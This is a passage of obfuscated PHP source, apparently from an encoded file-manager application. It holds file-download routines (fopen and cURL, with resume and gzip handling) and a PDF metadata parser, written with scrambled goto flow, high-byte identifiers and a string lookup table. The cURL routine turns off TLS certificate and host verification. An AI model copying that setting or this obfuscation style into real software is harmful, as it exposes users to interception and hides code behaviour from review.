$D“µÔ‡»ó„; } } $Dœó¯±ˆ· = is_file($AÖ¶æ¹) ? filesize($AÖ¶æ¹) : 0; goto FËÄáÆêÉË; cµÅÜÏô³: if ($Dœó¯±ˆ· > $C•êÄÙÇ…Û) { @unlink($AÖ¶æ¹); } file_put_contents($fº‰¢»ÃÆ, json_encode($c¢İ»­Ï…)); $D“µÔ‡»ó„ = self::fileDownloadCurl($eŒ“È˜“ƒ¦, $F•¬ğ¢ŠÌÅ, !0, $Dœó¯±ˆ·, $C•êÄÙÇ…Û); goto cÀ…éİá•ù; d•¾‰ŸÂ·: } static function fileDownloadFopen($a‰Ä‰½§, $E›ÜÛâ‚ÏÑ, $bâ³ç½·’¶ = 0) { $AÆÔóäåëù =& $_SERVER[¿õñ]; @ini_set($AÆÔóäåëù[1427], $AÆÔóäåëù[1428]); $DÏøÇÁÅÛ = $E›ÜÛâ‚ÏÑ . $AÆÔóäåëù[1424]; set_timeout(); @unlink($DÏøÇÁÅÛ); if ($cç‰¸ÓÙ” = @fopen($a‰Ä‰½§, $AÆÔóäåëù[1429])) { goto f‹¹ƒÕõ; bˆæ¼Ğ»Ÿ: fclose($cç‰¸ÓÙ”); $a²ÊĞ¨×² = filesize(iconv_system($DÏøÇÁÅÛ)); if ($bâ³ç½·’¶ != 0 && $a²ÊĞ¨×² != $bâ³ç½·’¶) { return array($AÆÔóäåëù[1017] => !1, $AÆÔóäåëù[1019] => $AÆÔóäåëù[1433]); } goto eƒ´Õ†‰ßŠ; eƒ´Õ†‰ßŠ: self::checkGzip($DÏøÇÁÅÛ); if (!@rename($DÏøÇÁÅÛ, $E›ÜÛâ‚ÏÑ)) { usleep(round(rand(0, 1000) * 50)); @unlink($E›ÜÛâ‚ÏÑ); $e„¬ƒí’™ª = @rename($DÏøÇÁÅÛ, $E›ÜÛâ‚ÏÑ); if (!$e„¬ƒí’™ª) { return array($AÆÔóäåëù[1017] => !1, $AÆÔóäåëù[1019] => $AÆÔóäåëù[1434]); } } return array($AÆÔóäåëù[1017] => !0, $AÆÔóäåëù[1019] => $AÆÔóäåëù[693]); goto cÕëƒ¡«ğ; f‹¹ƒÕõ: if (!($cˆ”Öİ²í = @fopen($DÏøÇÁÅÛ, $AÆÔóäåëù[1430]))) { return array($AÆÔóäåëù[1017] => !1, $AÆÔóäåëù[1019] => $AÆÔóäåëù[1431]); } while (!feof($cç‰¸ÓÙ”)) { if (!file_exists($DÏøÇÁÅÛ)) { fclose($cˆ”Öİ²í); return array($AÆÔóäåëù[1017] => !1, $AÆÔóäåëù[1019] => $AÆÔóäåëù[1432]); } clearstatcache(); if ($bâ³ç½·’¶ > 0 && $bâ³ç½·’¶ == filesize(iconv_system($DÏøÇÁÅÛ))) { break; } fwrite($cˆ”Öİ²í, fread($cç‰¸ÓÙ”, 1024 * 8), 1024 * 8); } fclose($cˆ”Öİ²í); goto bˆæ¼Ğ»Ÿ; cÕëƒ¡«ğ: } else { return array($AÆÔóäåëù[1017] => !1, $AÆÔóäåëù[1019] => $AÆÔóäåëù[1435]); } } static function fileDownloadCurl($b†Şª» £‹, $eÈÚ§ÓÓ¿Á, $FŞª´´†œˆ = false, $Bä«ˆëˆ = 0, $e°åµÓÈÂ = 0) { goto c®¬ËŒ¯¥µ; d²‚†—Ó¾ƒ: curl_setopt($c×å•÷—¨ˆ, CURLOPT_NOPROGRESS, !1); curl_setopt($c×å•÷—¨ˆ, CURLOPT_PROGRESSFUNCTION, $Dâ½¹¼¼…¿[1198]); curl_progress_start($c×å•÷—¨ˆ); goto b¼£Õ¿Ö‰; Dó‘‚ò°Œß: if ($d–·ÅÔô¼ < $e°åµÓÈÂ && $e°åµÓÈÂ != 0) { return array($Dâ½¹¼¼…¿[1017] => !1, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[1425]); } if ($d–·ÅÔô¼ > $e°åµÓÈÂ && $e°åµÓÈÂ != 0) { return array($Dâ½¹¼¼…¿[1017] => !1, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[1433]); } if ($F”¹Ùº…êÓ && filesize($EÍÚÖ’æ—”) != 0) { self::checkGzip($EÍÚÖ’æ—”); if (!@rename($EÍÚÖ’æ—”, $eÈÚ§ÓÓ¿Á)) { @unlink($eÈÚ§ÓÓ¿Á); $F”¹Ùº…êÓ = @rename($EÍÚÖ’æ—”, $eÈÚ§ÓÓ¿Á); if (!$F”¹Ùº…êÓ) { return array($Dâ½¹¼¼…¿[1017] => !1, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[1437]); } } return array($Dâ½¹¼¼…¿[1017] => !0, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[693]); } goto D‚º½ßŞ”«; c®¬ËŒ¯¥µ: $Dâ½¹¼¼…¿ =& $_SERVER[¿õñ]; $EÍÚÖ’æ—” = $eÈÚ§ÓÓ¿Á . $Dâ½¹¼¼…¿[1424]; set_timeout(); goto c‹Ûâ‹Ãí; D‚º½ßŞ”«: return array($Dâ½¹¼¼…¿[1017] => !1, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[1438]); goto DÏ¹õÃÄ‰; c‹Ûâ‹Ãí: $Eõ™ôßñğ— = @fopen($EÍÚÖ’æ—”, $Dâ½¹¼¼…¿[717]); if (!$Eõ™ôßñğ—) { return array($Dâ½¹¼¼…¿[1017] => !1, $Dâ½¹¼¼…¿[1019] => $Dâ½¹¼¼…¿[1436]); } $c×å•÷—¨ˆ = curl_init($b†Şª» £‹); goto D‰åáÁÓœ; cÓÇŒ”ìÉŸ: curl_setopt($c×å•÷—¨ˆ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($c×å•÷—¨ˆ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($c×å•÷—¨ˆ, CURLOPT_SSL_VERIFYHOST, 0); goto d²‚†—Ó¾ƒ; A¹ÖÅ°Ûš²: curl_close($c×å•÷—¨ˆ); fclose($Eõ™ôßñğ—); $d–·ÅÔô¼ = filesize(iconv_system($EÍÚÖ’æ—”)); goto Dó‘‚ò°Œß; D‰åáÁÓœ: if ($FŞª´´†œˆ) { curl_setopt($c×å•÷—¨ˆ, CURLOPT_RANGE, $Bä«ˆëˆ . $Dâ½¹¼¼…¿[710]); } curl_setopt($c×å•÷—¨ˆ, CURLOPT_FILE, $Eõ™ôßñğ—); curl_setopt($c×å•÷—¨ˆ, CURLOPT_REFERER, get_url_link($b†Şª» £‹)); goto cÓÇŒ”ìÉŸ; b¼£Õ¿Ö‰: curl_setopt($c×å•÷—¨ˆ, CURLOPT_USERAGENT, $Dâ½¹¼¼…¿[1428]); $F”¹Ùº…êÓ = curl_exec($c×å•÷—¨ˆ); curl_progress_end($c×å•÷—¨ˆ); goto A¹ÖÅ°Ûš²; DÏ¹õÃÄ‰: } static function checkGzip($eÙø¨èË®„) { goto dñ¶…–öš; D¨‘í¥£Ú÷: file_put_contents($eÙø¨èË®„, $EßÀŸ³Ò‹Ó); goto b´øÏ‹ÙÌÚ; dñ¶…–öš: $CØ‡ßËÍø† = $_SERVER[¿õñ][1439]; $Fèö„éîƒŒ = file_sub_str($eÙø¨èË®„, 0, 2); if ($CØ‡ßËÍø† != $Fèö„éîƒŒ) { return; } goto C‘ª‹øŠ; C‘ª‹øŠ: ob_start(); readgzfile($eÙø¨èË®„); $EßÀŸ³Ò‹Ó = ob_get_clean(); goto D¨‘í¥£Ú÷; b´øÏ‹ÙÌÚ: } } class FileParsePdf { public static function parse($fÂİùÉÏÒ“) { goto E˜È¥ Üñ; Aïèƒ³‡½É: if ($dÖ’–Ñ‚§…) { $Dì‘¾—õ…™ = $dÖ’–Ñ‚§…[$Fè¢­˜ñ[1443]][$Fè¢­˜ñ[1161]]; $A†±ØøšÑÕ = self::getObjectValue($F’¡¶Çá, $dÖ’–Ñ‚§…, $Dì‘¾—õ…™); } $A†±ØøšÑÕ = is_array($A†±ØøšÑÕ) ? $A†±ØøšÑÕ : array(); $A†±ØøšÑÕ[$Fè¢­˜ñ[1444]] = 0; goto Bï óÄİ†»; E˜È¥ Üñ: $Fè¢­˜ñ =& $_SERVER[¿õñ]; $eÙºæ±Ì‚Ú = 32 * 1024; $F’¡¶Çá = array($Fè¢­˜ñ[789] => fopen($fÂİùÉÏÒ“, $Fè¢­˜ñ[1138]), $Fè¢­˜ñ[76] => $fÂİùÉÏÒ“, $Fè¢­˜ñ[78] => filesize($fÂİùÉÏÒ“), $Fè¢­˜ñ[1440] => $eÙºæ±Ì‚Ú); goto C‚ĞÃÊÕ˜Ú; a¸ë˜äï: preg_match($D«×´µ°Ìè, $F’¡¶Çá[$Fè¢­˜ñ[1442]], $E£’†ëêà); if (!$A†±ØøšÑÕ[$Fè¢­˜ñ[1444]] && count($E£’†ëêà) == 5) { $A†±ØøšÑÕ[$Fè¢­˜ñ[1444]] = $E£’†ëêà[3]; $A†±ØøšÑÕ[$Fè¢­˜ñ[1446]] = $E£’†ëêà[4]; } preg_match($Fè¢­˜ñ[1447], $F’¡¶Çá[$Fè¢­˜ñ[1441]], $E£’†ëêà); goto fùÄ·‘ÚÁ©; fùÄ·‘ÚÁ©: if ($E£’†ëêà) { $A†±ØøšÑÕ[$Fè¢­˜ñ[1246]] = $E£’†ëêà[1]; } $A†±ØøšÑÕ[$Fè¢­˜ñ[1448]] = 0; $D«×´µ°Ìè = $Fè¢­˜ñ[1449]; goto dğåîÆˆ‘Œ; Bï óÄİ†»: $D«×´µ°Ìè = $Fè¢­˜ñ[1445]; preg_match($D«×´µ°Ìè, $F’¡¶Çá[$Fè¢­˜ñ[1441]], $E£’†ëêà); if (!$A†±ØøšÑÕ[$Fè¢­˜ñ[1444]] && count($E£’†ëêà) == 5) { $A†±ØøšÑÕ[$Fè¢­˜ñ[1444]] = $E£’†ëêà[3]; $A†±ØøšÑÕ[$Fè¢­˜ñ[1446]] = $E£’†ëêà[4]; } goto a¸ë˜äï; dğåîÆˆ‘Œ: preg_match_all($D«×´µ°Ìè, $F’¡¶Çá[$Fè¢­˜ñ[1441]], $E£’†ëêà); if ($E£’†ëêà[1] && $A†±ØøšÑÕ[$Fè¢­˜ñ[1448]] < $E£’†ëêà[1][0]) { $A†±ØøšÑÕ[$Fè¢­˜ñ[1448]] = $E£’†ëêà[1][0]; } preg_match_all($D«×´µ°Ìè, $F’¡¶Çá[$Fè¢­˜ñ[1442]], $E£’†ëêà); goto c´ñÕÎÉé; c´ñÕÎÉé: if ($E£’†ëêà[1] && $A†±ØøšÑÕ[$Fè¢­˜ñ[1448]] < $E£’†ëêà[1][0]) { $A†±ØøšÑÕ[$Fè¢­˜ñ[1448]] = $E£’†ëêà[1][0]; } $A†±ØøšÑÕ = self::parseInfoItem($A†±ØøšÑÕ); return $A†±ØøšÑÕ; goto F°©±Á²œÖ; C‚ĞÃÊÕ˜Ú: $F’¡¶Çá[$Fè¢­˜ñ[1441]] = StreamWrapperIO::read($fÂİùÉÏÒ“, 0, $eÙºæ±Ì‚Ú); $F’¡¶Çá[$Fè¢­˜ñ[1442]] = StreamWrapperIO::read($fÂİùÉÏÒ“, $F’¡¶Çá[$Fè¢­˜ñ[78]] - $eÙºæ±Ì‚Ú, $eÙºæ±Ì‚Ú); $dÖ’–Ñ‚§… = self::decodeXref($F’¡¶Çá); goto Aïèƒ³‡½É; F°©±Á²œÖ: } private static function parseInfoItem($dŠËÚ£Ğ¨Ú) { $DÀ‚ÏŒùÍ˜ =& $_SERVER[¿õñ]; if (!$dŠËÚ£Ğ¨Ú) { return !1; } $C³íàÉ¶â‰ = array($DÀ‚ÏŒùÍ˜[1247] => array($DÀ‚ÏŒùÍ˜[1450], $DÀ‚ÏŒùÍ˜[33]), $DÀ‚ÏŒùÍ˜[1451] => array($DÀ‚ÏŒùÍ˜[1452], $DÀ‚ÏŒùÍ˜[33]), $DÀ‚ÏŒùÍ˜[184] => array($DÀ‚ÏŒùÍ˜[1453], $DÀ‚ÏŒùÍ˜[207]), $DÀ‚ÏŒùÍ˜[106] => array($DÀ‚ÏŒùÍ˜[1454], $DÀ‚ÏŒùÍ˜[207]), $DÀ‚ÏŒùÍ˜[1448] => array($DÀ‚ÏŒùÍ˜[1448], $DÀ‚ÏŒùÍ˜[273]), $DÀ‚ÏŒùÍ˜[1444] => array($DÀ‚ÏŒùÍ˜[1444], $DÀ‚ÏŒùÍ˜[273]), $DÀ‚ÏŒùÍ˜[1446] => array($DÀ‚ÏŒùÍ˜[1446], $DÀ‚ÏŒùÍ˜[273]), $DÀ‚ÏŒùÍ˜[1455] => array($DÀ‚ÏŒùÍ˜[1456], $DÀ‚ÏŒùÍ˜[33]), $DÀ‚ÏŒùÍ˜[1457] => array($DÀ‚ÏŒùÍ˜[1458], $DÀ‚ÏŒùÍ˜[33]), $DÀ‚ÏŒùÍ˜[1459] => array($DÀ‚ÏŒùÍ˜[1246], $DÀ‚ÏŒùÍ˜[33])); $eÙÛ—¥ò = array(); foreach ($C³íàÉ¶â‰ as $Dİ—£øª => $DÂˆôÙà) { if (!isset($dŠËÚ£Ğ¨Ú[$DÂˆôÙà[0]])) { continue; } $Cßˆ÷ÍÅÒ« = $dŠËÚ£Ğ¨Ú[$DÂˆôÙà[0]]; if (!$Cßˆ÷ÍÅÒ« || is_array($Cßˆ÷ÍÅÒ«)) { continue; } switch ($DÂˆôÙà[1]) { case $DÀ‚ÏŒùÍ˜[273]: $Cßˆ÷ÍÅÒ« = intval($Cßˆ÷ÍÅÒ«); break; case $DÀ‚ÏŒùÍ˜[207]: if (substr($Cßˆ÷ÍÅÒ«, 0, 2) == $DÀ‚ÏŒùÍ˜[1460]) { $Cßˆ÷ÍÅÒ« = substr($Cßˆ÷ÍÅÒ«, 2, 14); } if (strtotime($Cßˆ÷ÍÅÒ«)) { $Cßˆ÷ÍÅÒ« = date($DÀ‚ÏŒùÍ˜[1461], strtotime($Cßˆ÷ÍÅÒ«)); } break; } $eÙÛ—¥ò[$Dİ—£øª] = $Cßˆ÷ÍÅÒ«; } return $eÙÛ—¥ò; } private static function decodeXref(&$dÙ±‚§„îœ) { goto F·‰’ùÔôÕ; eŸê¶İÉ²Ş: if ($dÙ±‚§„îœ[$f¿†¸îÀÙÑ[78]] - $d¯ªƒÉáË¾ > $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1440]]) { $Bš§²Ñ = 4 * $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1440]]; $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1440]] = $Bš§²Ñ; $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1441]] = StreamWrapperIO::read($dÙ±‚§„îœ[$f¿†¸îÀÙÑ[76]], 0, $Bš§²Ñ); $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1442]] = StreamWrapperIO::read($dÙ±‚§„îœ[$f¿†¸îÀÙÑ[76]], $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[78]] - $Bš§²Ñ, $Bš§²Ñ); $CÒ‹¡“ÅÏñ = $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1442]]; } $fŒ¨ÖÙ‚¹ñ = 0; preg_match_all($f¿†¸îÀÙÑ[1464], $CÒ‹¡“ÅÏñ, $f×¹ˆØÙ˜Ñ); goto FÑ„†’âÈš; cµìÍî‚Ä£: if (preg_match($f¿†¸îÀÙÑ[1469], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[78]] = intval($f×¹ˆØÙ˜Ñ[1]); } if (preg_match($f¿†¸îÀÙÑ[1470], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[1471]] = intval($f×¹ˆØÙ˜Ñ[1]) . $f¿†¸îÀÙÑ[71] . intval($f×¹ˆØÙ˜Ñ[2]); } if (preg_match($f¿†¸îÀÙÑ[1472], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[1473]] = intval($f×¹ˆØÙ˜Ñ[1]) . $f¿†¸îÀÙÑ[71] . intval($f×¹ˆØÙ˜Ñ[2]); } goto EÈ¼ÖËó™‹; cµ­¬Íİá¾: if (preg_match($f¿†¸îÀÙÑ[1476], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { } return $a’™Óƒø; goto f×™È‰Åôˆ; FÔêšÒ™äß: $E„Ûèãğã = $f¿†¸îÀÙÑ[1463]; if (!preg_match_all($E„Ûèãğã, $CÒ‹¡“ÅÏñ, $f×¹ˆØÙ˜Ñ, PREG_SET_ORDER, 0)) { return !1; } $d¯ªƒÉáË¾ = intval($f×¹ˆØÙ˜Ñ[0][1]); goto eŸê¶İÉ²Ş; EÈ¼ÖËó™‹: if (preg_match($f¿†¸îÀÙÑ[1474], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[1161]] = intval($f×¹ˆØÙ˜Ñ[1]) . $f¿†¸îÀÙÑ[71] . intval($f×¹ˆØÙ˜Ñ[2]); } if (preg_match($f¿†¸îÀÙÑ[1475], $fÏ°Ş•øØä, $f×¹ˆØÙ˜Ñ) > 0) { $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[364]] = array(); $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[364]][0] = $f×¹ˆØÙ˜Ñ[1]; $a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[364]][1] = $f×¹ˆØÙ˜Ñ[2]; } if (!$a’™Óƒø[$f¿†¸îÀÙÑ[1443]][$f¿†¸îÀÙÑ[1161]]) { return !1; } goto cµ­¬Íİá¾; FÑ„†’âÈš: foreach ($f×¹ˆØÙ˜Ñ[3] as $dÆº‚Ò¶õÏ => $C„ø¨¼·‚Ş) { if ($f×¹ˆØÙ˜Ñ[3][$dÆº‚Ò¶õÏ] == $f¿†¸îÀÙÑ[1465]) { $Fêğ©½àÆ = $fŒ¨ÖÙ‚¹ñ . $f¿†¸îÀÙÑ[71] . intval($f×¹ˆØÙ˜Ñ[2][$dÆº‚Ò¶õÏ]); $a’™Óƒø[$f¿†¸îÀÙÑ[1462]][$Fêğ©½àÆ] = intval($f×¹ˆØÙ˜Ñ[1][$dÆº‚Ò¶õÏ]); ++$fŒ¨ÖÙ‚¹ñ; } else { if ($f×¹ˆØÙ˜Ñ[3][$dÆº‚Ò¶õÏ] == $f¿†¸îÀÙÑ[1466]) { ++$fŒ¨ÖÙ‚¹ñ; } else { } } } if (preg_match_all($f¿†¸îÀÙÑ[1467], $CÒ‹¡“ÅÏñ, $f×¹ˆØÙ˜Ñ)) { $Eó³ ğÎÙ¸ = $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[78]] - $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1440]]; foreach ($f×¹ˆØÙ˜Ñ[0] as $dÆº‚Ò¶õÏ => $d‚çôŠŸ±) { $Bß›¤ÖŠµ = $f×¹ˆØÙ˜Ñ[1][$dÆº‚Ò¶õÏ] . $f¿†¸îÀÙÑ[71] . $f×¹ˆØÙ˜Ñ[2][$dÆº‚Ò¶õÏ]; $a’™Óƒø[$f¿†¸îÀÙÑ[1462]][$Bß›¤ÖŠµ] = strpos($CÒ‹¡“ÅÏñ, $d‚çôŠŸ±) + $Eó³ ğÎÙ¸ + 1; } } if (preg_match_all($f¿†¸îÀÙÑ[1468], $CÒ‹¡“ÅÏñ, $f×¹ˆØÙ˜Ñ)) { $fÏ°Ş•øØä = count($f×¹ˆØÙ˜Ñ[1]) == 1 ? $f×¹ˆØÙ˜Ñ[1][0] : $f×¹ˆØÙ˜Ñ[1][1]; } else { $fÏ°Ş•øØä = substr($CÒ‹¡“ÅÏñ, -1024 * 5); } goto cµìÍî‚Ä£; F·‰’ùÔôÕ: $f¿†¸îÀÙÑ =& $_SERVER[¿õñ]; $CÒ‹¡“ÅÏñ = $dÙ±‚§„îœ[$f¿†¸îÀÙÑ[1442]]; $a’™Óƒø = array($f¿†¸îÀÙÑ[1443] => array(), $f¿†¸îÀÙÑ[1462] => array()); goto FÔêšÒ™äß; f×™È‰Åôˆ: } private static function getObjectValue($bøñªå¡«½, $cÆ÷µ¨éİ‚, $eï‘…ÊŞ•è) { goto eÆœó¦Æ™Í; eÆœó¦Æ™Í: $cùŒáÃ‡ºÂ =& $_SERVER[¿õñ]; $e·¾”­¶Ó = self::getObject($bøñªå¡«½, $cÆ÷µ¨éİ‚[$cùŒáÃ‡ºÂ[1462]][$eï‘…ÊŞ•è]); if (is_string($e·¾”­¶Ó[1])) { return $e·¾”­¶Ó[1]; } goto A¿îÉãª¤ ; A¿îÉãª¤ : if (!is_array($e·¾”­¶Ó[1])) { return array(); } $BéœÕ¼°Ú = array(); for ($eîÃæŞ‡¯ = 0; $eîÃæŞ‡¯ < count($e·¾”­¶Ó[1]); $eîÃæŞ‡¯ += 2) { $E†‘º®ùÒ§ = $e·¾”­¶Ó[1][$eîÃæŞ‡¯]; $E®¦è™Ãó£ = $e·¾”­¶Ó[1][$eîÃæŞ‡¯ + 1]; if (count($E†‘º®ùÒ§) == 3 && $E†‘º®ùÒ§[0] == $cùŒáÃ‡ºÂ[8]) { $DÁÂàæá×Ó = !1; if ($E®¦è™Ãó£[0] == $cùŒáÃ‡ºÂ[1477]) { $E®¦è™Ãó£ = self::getObject($bøñªå¡«½, $cÆ÷µ¨éİ‚[$cùŒáÃ‡ºÂ[1462]][$E®¦è™Ãó£[1]]); } $DÁÂàæá×Ó = $E®¦è™Ãó£[1]; if ($DÁÂàæá×Ó === !1) { continue; } if (is_string($DÁÂàæá×Ó)) { $DÁÂàæá×Ó = self::decodeStr($DÁÂàæá×Ó); } $BéœÕ¼°Ú[$E†‘º®ùÒ§[1]] = $DÁÂàæá×Ó; } } goto añò›·Ç¥; añò›·Ç¥: return $BéœÕ¼°Ú; goto C‚ò‹¬©İä; C‚ò‹¬©İä: } private static function getObject($Cµùİµ¡Øˆ, $Fƒí”æï•½) { $f·–Áå¹æ = self::getObjectItem($Cµùİµ¡Øˆ, $Fƒí”æï•½); $f·–Áå¹æ = self::getObjectItem($Cµùİµ¡Øˆ, $f·–Áå¹æ[2]); return $f·–Áå¹æ; } private static function getObjectItem($Eùô¶Œ†÷‡, $F‰º¾›ˆ‘“) { goto bÊÁ–‚Ë…; bÊÁ–‚Ë…: $BÄµ„øŠÅ— =& $_SERVER[¿õñ]; $eÎã¯ß·„ó = $Eùô¶Œ†÷‡[$BÄµ„øŠÅ—[1440]]; $A›‡Ù¤ÁŞœ = $Eùô¶Œ†÷‡[$BÄµ„øŠÅ—[78]] - $eÎã¯ß·„ó; goto cÀæÆ‹¿¬; cÀæÆ‹¿¬: $EĞ‡¢¹Ú = $F‰º¾›ˆ‘“ >= $A›‡Ù¤ÁŞœ ? $F‰º¾›ˆ‘“ - $A›‡Ù¤ÁŞœ : $F‰º¾›ˆ‘“; $b–ÒŸõ¦–˜ = $F‰º¾›ˆ‘“ >= $A›‡Ù¤ÁŞœ ? $Eùô¶Œ†÷‡[$BÄµ„øŠÅ—[1442]] : $Eùô¶Œ†÷‡[$BÄµ„øŠÅ—[1441]]; if ($F‰º¾›ˆ‘“ > $eÎã¯ß·„ó && $F‰º¾›ˆ‘“ <= $A›‡Ù¤ÁŞœ) { $EĞ‡¢¹Ú = 0; $b–ÒŸõ¦–˜ = StreamWrapperIO::read($Eùô¶Œ†÷‡[$BÄµ„øŠÅ—[76]], $F‰º¾›ˆ‘“, $eÎã¯ß·„ó); } goto d×ŸËÕíÜ; d×ŸËÕíÜ: $a½ŒäÛ­ÜÉ = self::getRawObject($b–ÒŸõ¦–˜, $EĞ‡¢¹Ú); if ($F‰º¾›ˆ‘“ >= $A›‡Ù¤ÁŞœ) { $a½ŒäÛ­ÜÉ[2] = $a½ŒäÛ­ÜÉ[2] + $A›‡Ù¤ÁŞœ; } else { if ($F‰º¾›ˆ‘“ > $eÎã¯ß·„ó && $F‰º¾›ˆ‘“ <= $A›‡Ù¤ÁŞœ) { $a½ŒäÛ­ÜÉ[2] = $a½ŒäÛ­ÜÉ[2] + $F‰º¾›ˆ‘“; } } return $a½ŒäÛ­ÜÉ; goto d„à„Äù²ê; d„à„Äù²ê: } private static function decodeStr($Eî«ª§³·) { goto BØ±¯Í¡õÙ; BØ±¯Í¡õÙ: $A¢ñÅ‚¿Ÿî =& $_SERVER[¿õñ]; $Eî«ª§³· = str_replace(array($A¢ñÅ‚¿Ÿî[1478], $A¢ñÅ‚¿Ÿî[1479], $A¢ñÅ‚¿Ÿî[1480], $A¢ñÅ‚¿Ÿî[1481], $A¢ñÅ‚¿Ÿî[1482], $A¢ñÅ‚¿Ÿî[1483], $A¢ñÅ‚¿Ÿî[1484], $A¢ñÅ‚¿Ÿî[1485]), array($A¢ñÅ‚¿Ÿî[94], $A¢ñÅ‚¿Ÿî[50], $A¢ñÅ‚¿Ÿî[8], $A¢ñÅ‚¿Ÿî[245], $A¢ñÅ‚¿Ÿî[823], $A¢ñÅ‚¿Ÿî[214], $A¢ñÅ‚¿Ÿî[726], $A¢ñÅ‚¿Ÿî[327]), $Eî«ª§³·); $CµŠÉ‹• = preg_split($A¢ñÅ‚¿Ÿî[1486], $Eî«ª§³·, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CÙÓó«µÔğ; cğƒ®ïÏ™¦: $Eî«ª§³· = $A¢ñÅ‚¿Ÿî[33]; foreach ($CµŠÉ‹• as $B£Ë¬®¬ç) { if (preg_match($A¢ñÅ‚¿Ÿî[1489], $B£Ë¬®¬ç)) { $Eî«ª§³· .= \chr(hexdec(trim($B£Ë¬®¬ç, $A¢ñÅ‚¿Ÿî[1490]))); } else { $Eî«ª§³· .= $B£Ë¬®¬ç; } } $CµŠÉ‹• = preg_split($A¢ñÅ‚¿Ÿî[1491], $Eî«ª§³·, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto BÓè«®îñæ; BÓè«®îñæ: $Eî«ª§³· = $A¢ñÅ‚¿Ÿî[33]; foreach ($CµŠÉ‹• as $B£Ë¬®¬ç) { if (preg_match($A¢ñÅ‚¿Ÿî[1492], $B£Ë¬®¬ç) && !1 === stripos($B£Ë¬®¬ç, $A¢ñÅ‚¿Ÿî[1493])) { $B£Ë¬®¬ç = preg_replace($A¢ñÅ‚¿Ÿî[1494], $A¢ñÅ‚¿Ÿî[33], $B£Ë¬®¬ç); $B£Ë¬®¬ç = trim($B£Ë¬®¬ç, $A¢ñÅ‚¿Ÿî[933]); $B£Ë¬®¬ç = pack($A¢ñÅ‚¿Ÿî[1495], $B£Ë¬®¬ç); $Eî«ª§³· .= $B£Ë¬®¬ç; } else { $Eî«ª§³· .= $B£Ë¬®¬ç; } } if (preg_match($A¢ñÅ‚¿Ÿî[1496], $Eî«ª§³·)) { $dáÂ³ƒÈñ¦ = substr($Eî«ª§³·, 2); $Eî«ª§³· = $A¢ñÅ‚¿Ÿî[33]; $DÆÔ½Ø–»¥ = strlen($dáÂ³ƒÈñ¦); for ($c‘‚îƒäÂê = 0; $c‘‚îƒäÂê < $DÆÔ½Ø–»¥; $c‘‚îƒäÂê += 2) { $Cõ¯Ó»ÊĞˆ = hexdec(bin2hex(substr($dáÂ³ƒÈñ¦, $c‘‚îƒäÂê, 2))); $Eî«ª§³· .= mb_convert_encoding($A¢ñÅ‚¿Ÿî[1497] . intval($Cõ¯Ó»ÊĞˆ) . $A¢ñÅ‚¿Ÿî[68], $A¢ñÅ‚¿Ÿî[1498], $A¢ñÅ‚¿Ÿî[1499]); } } goto dÄß¿çä; CÙÓó«µÔğ: $Eî«ª§³· = $A¢ñÅ‚¿Ÿî[33]; foreach ($CµŠÉ‹• as $B£Ë¬®¬ç) { if (preg_match($A¢ñÅ‚¿Ÿî[1487], $B£Ë¬®¬ç)) { $Eî«ª§³· .= \chr(octdec(trim($B£Ë¬®¬ç, $A¢ñÅ‚¿Ÿî[94]))); } else { $Eî«ª§³· .= $B£Ë¬®¬ç; } } $CµŠÉ‹• = preg_split($A¢ñÅ‚¿Ÿî[1488], $Eî«ª§³·, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto cğƒ®ïÏ™¦; dÄß¿çä: return $Eî«ª§³·; goto aÒÒÀè›ßö; aÒÒÀè›ßö: } private static function getRawObject($Aëîø»ÊßÜ, $aùÖß¥Ë¼ = 0) { goto fÍŞŞ×È; B¥Ë½‡¢Ò´: $aùÖß¥Ë¼ += strspn($Aëîø»ÊßÜ, $FÆé Àº¢º[1500], $aùÖß¥Ë¼); $dÏ©ÀÅ’¹´ = $Aëîø»ÊßÜ[$aùÖß¥Ë¼]; switch ($dÏ©ÀÅ’¹´) { case $FÆé Àº¢º[1501]: $C£Ëë‡ÕÌõ = strcspn($Aëîø»ÊßÜ, $FÆé Àº¢º[1502], $aùÖß¥Ë¼); if ($C£Ëë‡ÕÌõ > 0) { $aùÖß¥Ë¼ += $C£Ëë‡ÕÌõ; return self::getRawObject($Aëîø»ÊßÜ, $aùÖß¥Ë¼); } break; case $FÆé Àº¢º[8]: $E‰­ÅéÂŞÁ = $dÏ©ÀÅ’¹´; ++$aùÖß¥Ë¼; $CÃÄ‰‰§ó = preg_match($FÆé Àº¢º[1503], substr($Aëîø»ÊßÜ, 